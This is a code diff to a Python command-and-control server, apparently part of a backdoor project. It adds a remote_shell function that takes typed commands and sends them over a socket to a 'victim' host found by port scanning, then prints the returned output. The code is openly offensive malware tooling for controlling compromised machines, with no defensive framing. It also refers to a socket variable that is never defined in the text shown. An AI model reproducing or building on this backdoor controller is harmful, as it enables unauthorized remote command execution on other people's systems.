@@ -1,6 +1,8 @@
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
+from aiohttp import web
+
 import socket
 
 INIT_MESSAGE = b'This message will be signed and verified'
@@ -56,4 +58,22 @@ def find_victim(host = VICTIM_IP, port = BASE_PORT):
                 print(f"[CNCServer] Authenticated failed port {port}.")
         port += 1
 
+def remote_shell():
+    print("[CNCServer] Starting terminal...")
+
+    while True:
+        cmd = input("$: ")
+        if(cmd == "exit"):
+            s.close()
+            break
+        else:
+            s.send(cmd.encode('utf-8'))
+        output = s.recv(4096)
+        print(output.decode())
+
+# connect to victim
 find_victim()
+
+# write commands to backdoor
+remote_shell()
+
